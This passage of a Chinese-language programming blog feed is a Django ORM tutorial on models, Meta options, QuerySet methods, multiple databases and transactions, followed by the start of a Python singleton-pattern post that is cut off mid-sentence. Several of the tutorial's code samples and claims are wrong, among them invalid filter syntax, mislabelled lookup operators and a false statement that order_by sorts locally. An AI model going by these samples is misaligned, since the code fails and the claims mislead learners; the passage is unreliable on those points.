<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length=<span class="number">200</span>, primary_key=<span class="literal">True</span>)</span><br><span class="line">    email = models.EmailField(null=<span class="literal">True</span>)</span><br><span class="line">    date = models.DateField(auto_now=<span class="literal">True</span>)</span><br><span class="line">    update_time = models.DateTimeField(auto_now=<span class="literal">True</span>)</span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    null_test = models.CharField(max_length=<span class="number">200</span>, null=<span class="literal">True</span>)</span><br><span class="line">    blank_test = models.CharField(max_length=<span class="number">200</span>, blank=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>更新同步</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> manage.<span class="keyword">py</span> makemigrations</span><br><span class="line"><span class="keyword">python</span> manage.<span class="keyword">py</span> migrate</span><br></pre></td></tr></table></figure>

<p>进入shell, 创建保存一条数据</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> manage.<span class="keyword">py</span> <span class="keyword">shell</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; from myblog.models import Person</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p = Person(name=<span class="string">&#x27;owq&#x27;</span>)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.save()</span></span><br></pre></td></tr></table></figure>

<p>回头看看数据库</p>
<p><img data-src="http://img.owq.world/2022/03/1553-ee0a9f.png"></p>
<h2 id="数据表重构"><a href="#数据表重构" class="headerlink" title="数据表重构"></a>数据表重构</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><blockquote>
<p>执行<code>python manage.py migrate</code>同步失败时</p>
</blockquote>
<ul>
<li>更改<code>migrations</code>中的文件解决问题<ul>
<li>通过调试确认是哪个字段发生错误</li>
</ul>
</li>
</ul>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><blockquote>
<p>数据结构发生改变时</p>
</blockquote>
<ul>
<li>删除<code>migrations</code>文件然后推倒重来<ul>
<li><code>django</code>会在数据表<code>django_migrations</code>中创建同步记录, 需要删除对应的同步记录</li>
<li>删除已经创建记录的表</li>
</ul>
</li>
</ul>
<h2 id="Meta内嵌类"><a href="#Meta内嵌类" class="headerlink" title="Meta内嵌类"></a>Meta内嵌类</h2><blockquote>
<p>通过一个内嵌类Meta来定义元数据.<br>元数据又被称为中介数据, 用来描述数据的数据, 既“所有不是字段的东西”.</p>
</blockquote>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ox</span>(models.Model):</span><br><span class="line">    horn_length = models.IntegerField()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        ordering = [<span class="string">&quot;horn_length&quot;</span>]</span><br><span class="line">        verbose_name_plural = <span class="string">&quot;oxen&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="字段选项"><a href="#字段选项" class="headerlink" title="字段选项"></a>字段选项</h3><ul>
<li><p><code>abstract</code><br>将当前模型类转换为抽象类, 进行<code>migrate</code>的时候会被忽略, 也就不会对实体表进行修改.</p>
</li>
<li><p><code>app_label</code><br>指定当前<code>model</code>从属于哪个已经注册的应用.<br>一般为应用只编写视图层来处理业务逻辑. 模型层统一由一个<code>models</code>模块来管理<br>比如博客的个人信息<code>models</code>, 很多应用都会使用到, 这时就要使用<code>app_label</code>来区分所属应用了.</p>
</li>
<li><p><code>db_table</code><br>自定义表名, 不指定默认为<code>应用名_模型名</code>, 一般在以下情况使用.</p>
<ul>
<li>目标表已经存在时</li>
<li>没有管理表的权限. 需要dba建表再开发时</li>
<li>规范数据库的表名命名时</li>
</ul>
</li>
<li><p><code>managed</code><br>默认为<code>True</code>, 为<code>False</code>将不会针对当前模型创建和删除数据库表, 也就是会忽略该模型. 一般会在公司有DBA时使用.</p>
</li>
<li><p><code>ordering</code><br>设置排序字段, 默认规则为升序.</p>
<ul>
<li><p>默认升序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ordering = <span class="string">&#x27;order_date&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>-</code>号表示降序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ordering = [<span class="string">&#x27;-order_date&#x27;</span>]</span><br><span class="line">ordering = [<span class="string">&#x27;-pub_date&#x27;</span>, <span class="string">&#x27;author&#x27;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>?</code>号表示随机</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ordering = [<span class="string">&#x27;?field_name&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>get_latest_by</code><br>设置获取最后一条记录的排序规则, 和模型的实例方法<code>latest()</code>相关联</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 升序排序 order_date 字段</span></span><br><span class="line">get_latest_by = <span class="string">&#x27;order_date&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 降序排序 priority, 后升序排序 order_date</span></span><br><span class="line">get_latest_by = [<span class="string">&#x27;-priority&#x27;</span>, <span class="string">&#x27;order_date&#x27;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>indexes</code><br>设置索引, 同样的, 在由DBA的情况下不需要用到.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">    indexes = [</span><br><span class="line">        models.Index(fields=[<span class="string">&#x27;last_name&#x27;</span>, <span class="string">&#x27;first_name&#x27;</span>]),</span><br><span class="line">        models.Index(fields=[<span class="string">&#x27;first_name&#x27;</span>], name=<span class="string">&#x27;first_name_idx&#x27;</span>),</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>constraints</code><br>自定义约束</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">    constraints = [</span><br><span class="line">        <span class="comment"># 创建一个检查约束</span></span><br><span class="line">        <span class="comment"># 确保年龄等于18</span></span><br><span class="line">        models.CheckConstraint(check=models.Q(age__gte=<span class="number">18</span>), name=<span class="string">&#x27;age_gte_18&#x27;</span>),</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 创建一个唯一约束</span></span><br><span class="line">        <span class="comment"># 确保每个房间在每个日期只能被预订一次</span></span><br><span class="line">		UniqueConstraint(field=[<span class="string">&#x27;room&#x27;</span>, <span class="string">&#x27;date&#x27;</span>], name=<span class="string">&#x27;unique_booking&#x27;</span>)</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>unique_together</code><br>多字段唯一性约束(未来可能被弃用, 了解下就行)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一组字段名，合起来必须是唯一的</span></span><br><span class="line">unique_together = [<span class="string">&#x27;driver&#x27;</span>, <span class="string">&#x27;restaurant&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="模型继承"><a href="#模型继承" class="headerlink" title="模型继承"></a>模型继承</h2><h3 id="直接继承"><a href="#直接继承" class="headerlink" title="直接继承"></a>直接继承</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CommonInfo</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length=<span class="number">100</span>)</span><br><span class="line">    age = models.PositiveIntegerField()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        abstract = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">CommonInfo</span>):</span><br><span class="line">    home_group = models.CharField(max_length=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<h3 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h3><blockquote>
<p>默认情况下，Django 给每个模型一个自动递增的主键.<br>如果当前模型对象没有指定主键, 那么两张表主键会产生冲突, 为了解决多重继承产生的id冲突, 需要覆盖主键字段.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(models.Model):</span><br><span class="line">    <span class="comment"># db_column为数据库中的字段</span></span><br><span class="line">    student_id = models.AutoField(primary_key=<span class="literal">True</span>, db_column=<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    name = models.CharField(max_length=<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span>(models.Model):</span><br><span class="line">    book_id = models.AutoField(primary_key=<span class="literal">True</span>, db_column=<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    book_name = models.CharField(max_length=<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BorrowRecord</span>(Student, Book):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 两张表主键冲突时, 要覆盖主键字段</span></span><br><span class="line">    _<span class="built_in">id</span> = models.AutoField(primary_key=<span class="literal">True</span>, db_column=<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    borrow_time = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<h2 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h2><ul>
<li><p><code>save()</code><br>将对象保存到数据库(或进行更新操作)</p>
<blockquote>
<p>只会进行数据库操作, 并不会进行字段验证.</p>
</blockquote>
</li>
<li><p><code>clean_fields()</code><br>验证模型上所有字段, 调用<code>save()</code>方法时不会被自动调用.</p>
</li>
<li><p><code>clean()</code><br>自定义模型验证的方法.</p>
</li>
<li><p><code>validate_unique()</code><br>验证模型上所有唯一约束, 和<code>unique_together</code>属性搭配使用.</p>
</li>
<li><p><code>full_clean()</code></p>
<p>依次调用 Model.clean_fields()、 Model.clean() 和 Model.validate_unique()</p>
</li>
<li><p><code>latest()</code><br>获取最后一条记录, 根据<code>get_latest_by</code>属性进行获取.</p>
</li>
<li><p><code>refresh_from_db()</code><br>从数据库里刷新当前记录, 适用于数据库数据发生变动时.</p>
</li>
<li><p><code>__str__()</code><br>用来自定义模型输出.</p>
</li>
</ul>
<h2 id="django-setup"><a href="#django-setup" class="headerlink" title="django.setup()"></a>django.setup()</h2><blockquote>
<p>用来独立运行Django中的应用, 类似于第三方库的使用.<br>比如，编写一个脚本, 然后进行一些ORM操作, 同时也方便我们进行调试.</p>
</blockquote>
<p>这里创建一个测试文件<code>test.py</code>, 使用它来进行调试学习.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> django</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_person_data</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        person = Person(</span><br><span class="line">            name=<span class="string">f&#x27;name_<span class="subst">&#123;i&#125;</span>&#x27;</span>,</span><br><span class="line">            email=<span class="string">f&#x27;email_<span class="subst">&#123;i&#125;</span>@163.com&#x27;</span>,</span><br><span class="line">            null_test=<span class="literal">None</span>,</span><br><span class="line">            blank_test=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 运行字段校验</span></span><br><span class="line">        <span class="comment"># 需要注意这里需要排除 null_test 字段, 忽略 NULL 值的校验</span></span><br><span class="line">        person.clean_fields(exclude=[<span class="string">&#x27;null_test&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 保存数据</span></span><br><span class="line">        person.save()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置DJANGO_SETTINGS_MODULE环境变量</span></span><br><span class="line">    os.environ.setdefault(<span class="string">&quot;DJANGO_SETTINGS_MODULE&quot;</span>, <span class="string">&quot;mysite.settings&quot;</span>)</span><br><span class="line">    django.setup()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> myblog.models <span class="keyword">import</span> Person</span><br><span class="line"></span><br><span class="line">    create_person_data()</span><br></pre></td></tr></table></figure>

<h2 id="QuerySet-API"><a href="#QuerySet-API" class="headerlink" title="QuerySet API"></a>QuerySet API</h2><blockquote>
<p><code>QuerySet</code> 本身被构造，过滤，切片，或者复制赋值等操作，是无需访问数据库的。<br>只有在你需要从数据库取出数据或者向数据库存入数据时才需要访问数据库.</p>
</blockquote>
<p>下面用CRUD给这些方法进行分类</p>
<ul>
<li><p><strong>Create</strong></p>
<ul>
<li><code>save()</code></li>
</ul>
</li>
<li><p><strong>Retrieve</strong></p>
<ul>
<li><p><code>all()</code><br>获取表中所有记录.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Model.objects.<span class="built_in">all</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>get()</code><br>通过指定条件, 获取<strong>一条</strong>数据, 如果有多条或不存在, 则会报错.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SELECT ... WHERE id = 22;</span></span><br><span class="line">Model.objects.get(<span class="built_in">id</span>=<span class="number">22</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>filter()</code><br>匹配满足条件的记录, 类似于<code>SQL</code>中的<code>WHERE</code>语句.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SELECT ... WHERE name = name_0;</span></span><br><span class="line">Model.objects.<span class="built_in">filter</span>(name=<span class="string">&quot;name_0&quot;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>Django</code>使用<code>__</code>来作为过滤条件标识符, 后面接上关键字来进行查询.</p>
</blockquote>
<p><strong>条件查询</strong></p>
<ul>
<li>gt --- &gt;</li>
<li>get -- &gt;&#x3D;</li>
<li>lt --- &lt;</li>
<li>lte -- &lt;</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SELECT ... WHERE id &gt; 22;</span></span><br><span class="line">Model.objects.<span class="built_in">filter</span>(id__gt=<span class="number">22</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SELECT ... WHERE id &lt;= 22;</span></span><br><span class="line">Model.objects.<span class="built_in">filter</span>(id__lte=<span class="number">22</span>)</span><br></pre></td></tr></table></figure>

<p><strong>模糊查询</strong></p>
<ul>
<li>startswith --- 匹配开头</li>
<li>endswith ----- 匹配结尾</li>
<li>icontains ---- 匹配内容</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SELECT ... WHERE name LIKE &#x27;Lennon%&#x27;;</span></span><br><span class="line">Model.objects.<span class="built_in">filter</span>(name__startswith=<span class="string">&#x27;Lennon&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SELECT ... WHERE name LIKE &#x27;%Lennon%&#x27;;</span></span><br><span class="line">Model.objects.<span class="built_in">filter</span>(name__startswith=<span class="string">&#x27;%Lennon%&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>exclude()</code><br>匹配不匹配对象, 与<code>filter()</code>逻辑相反.</p>
</li>
<li><p><code>latest()</code></p>
<p>返回最后一条数据.</p>
</li>
<li><p><code>order_by()</code></p>
<p>设置排序, 可以覆盖<code>ordering</code>选项</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这里需要注意, 排序并不涉及数据库操作, 是在本地进行的</span></span><br><span class="line">Model.objects.<span class="built_in">all</span>().order_by(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;id&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Update</strong></p>
<ul>
<li><code>save()</code></li>
</ul>
</li>
<li><p><strong>Delete</strong></p>
<ul>
<li><p><code>delete()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除id大于</span></span><br><span class="line">Model.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>&gt;=<span class="number">22</span>).delete()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="高级"><a href="#高级" class="headerlink" title="高级"></a>高级</h2><h3 id="原始SQL"><a href="#原始SQL" class="headerlink" title="原始SQL"></a>原始SQL</h3><blockquote>
<p>遇到复杂的场景, 使用<code>raw()</code>来执行<code>SQL</code>语句.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Reader._meta.db_table -- 记录所在表名</span></span><br><span class="line">Mode.objects.raw(<span class="string">f&quot;select * from <span class="subst">&#123;Reader._meta.db_table&#125;</span> limit 1&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="多个数据库"><a href="#多个数据库" class="headerlink" title="多个数据库"></a>多个数据库</h3><p>修改<code>mysite/settings.py</code>添加数据库配置.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;polls&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;HOST&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PORT&#x27;</span>: <span class="string">&#x27;3306&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;person&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;person&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;HOST&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PORT&#x27;</span>: <span class="string">&#x27;3306&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 <code>using</code> 参数指定数据库.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">person.save(using=<span class="string">&#x27;person&#x27;</span>)</span><br><span class="line">Person.objects.using(<span class="string">&#x27;person&#x27;</span>).<span class="built_in">all</span>()</span><br></pre></td></tr></table></figure>

<h3 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h3><p>使用<code>transaction.atomic()</code>控制数据库事务</p>
<ul>
<li><p>基于HTTP请求的事务</p>
<ul>
<li>在<code>settings</code>中要设置<code>ATOMIC_REQUESTS</code>为<code>True</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> transaction</span><br><span class="line"></span><br><span class="line"><span class="meta">@transaction.atomic</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">viewfunc</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># 在事务中执行的代码</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>基于视图具体逻辑的事务</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> transaction</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">viewfunc</span>(<span class="params">request</span>):</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">with</span> transaction.atomic():</span><br><span class="line">		<span class="comment"># 在事务中执行的代码</span></span><br><span class="line">		...</span><br></pre></td></tr></table></figure></li>
</ul>
<p>注意，只有视图被限制在事务中执行。中间件在事务之外运行，同理，渲染模板响应也是在事务之外运行的。</p>
<p><strong>参考文档📕</strong></p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRqYW5nb3Byb2plY3QuY29tL3poLWhhbnMvMy4yL3RvcGljcy9kYi9tb2RlbHMv">模型 | Django 文档 | Django (djangoproject.com)</span><br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRqYW5nb3Byb2plY3QuY29tL3poLWhhbnMvMy4yL3JlZi9tb2RlbHMvZmllbGRzLw==">模型字段参考 | Django 文档 | Django (djangoproject.com)</span><br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRqYW5nb3Byb2plY3QuY29tL3poLWhhbnMvMy4yL3JlZi9tb2RlbHMvb3B0aW9ucy8=">模型 Meta 选项 | Django 文档 | Django (djangoproject.com)</span><br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRqYW5nb3Byb2plY3QuY29tL3poLWhhbnMvMy4yL3JlZi9tb2RlbHMvY29uc3RyYWludHMv">约束参考 | Django 文档 | Django (djangoproject.com)</span><br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRqYW5nb3Byb2plY3QuY29tL3poLWhhbnMvMy4yL3RvcGljcy9zZXR0aW5ncy8=">Django 配置 | Django 文档 | Django (djangoproject.com)</span></p>
</blockquote>
]]></content>
      <categories>
        <category>学习教程</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>说说 python 中单例模式的实现</title>
    <url>/34b94b2a/</url>
    <content><![CDATA[<h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><blockquote>
<p><code>单例模式</code>是一种非常常用的软件设计模式，它定义是单例对象的类<code>只能允许一个实例存在</code>。</p>
</blockquote>
<p>单例模式有两种经典的实现方式<code>饿汉模式</code>和<code>懒汉模式</code>, 接下来以它们为开端来介绍单例模式.</p>
<h2 id="懒汉模式"><a href="#懒汉模式" class="headerlink" title="懒汉模式"></a>懒汉模式</h2><blockquote>
<p>顾名思义, 创建对象时比较懒, 到需要用到时才去创建.</p>
</blockquote>
<p>使用<code>__new__</code>类方法实现, 每次实例化类时会判断是否已有类属性<code>_instance</code>(里面存的是已经实例化的类对象), 有的话直接返回, 没有就创建新实例.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 类的构造方法, 会在__init__方法前执行</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):</span><br><span class="line">            cls._instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    S1 = Singleton()</span><br><span class="line">    S2 = Singleton()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(S1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(S2))</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">139789593957088</span><br><span class="line">139789593957088</span><br></pre></td></tr></table></figure>

<p>但这样存在一个问题, 如果同时实例化多个类, <code>if not hasattr(cls, &#39;_instance&#39;)</code>语句有可能同时成立, 这会造成创建多个新的实例, 比如在多线程操作下.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 类的构造方法, 会在__init__方法前执行</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):</span><br><span class="line">            time.sleep(<span class="number">1</span>)	<span class="comment"># 模拟程序延迟</span></span><br><span class="line">            cls._instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line"></span><br><span class="line">    S = Singleton()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(S))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    thread_array = [Thread(target=foo) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    [t.start() <span class="keyword">for</span> t <span class="keyword">in</span> thread_array]</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">139858525528848</span><br><span class="line">139858525530288</span><br></pre></td></tr></table></figure>

<p>这是因为多线程下的操作并不是原子性的, 解决方法也很简单, 加上互斥锁将<code>__new__</code>方法里的操作转变成原子性就好了.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock, Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>:</span><br><span class="line">    lock = Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 类的构造方法, 会在__init__方法前执行</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">with</span> cls.lock:  <span class="comment"># 加锁, 使操作转为原子性</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):</span><br><span class="line">                time.sleep(<span class="number">1</span>)	<span class="comment"># 模拟程序延迟</span></span><br><span class="line">                cls._instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    S = Singleton()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(S))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    thread_array = [Thread(target=foo) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    [t.start() <span class="keyword">for</span> t <span class="keyword">in</span> thread_array]</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">140572949160720</span><br><span class="line">140572949160720</span><br></pre></td></tr></table></figure>

<p>这样就没问题了吧? 不, 我们还需要对<code>__init__</code>函数做处理, 比方说以下的情况, 每次实例化虽不会创建新实例, 当会执行一遍初始化里的代码, 这是不久单例了个寂寞吗?</p>
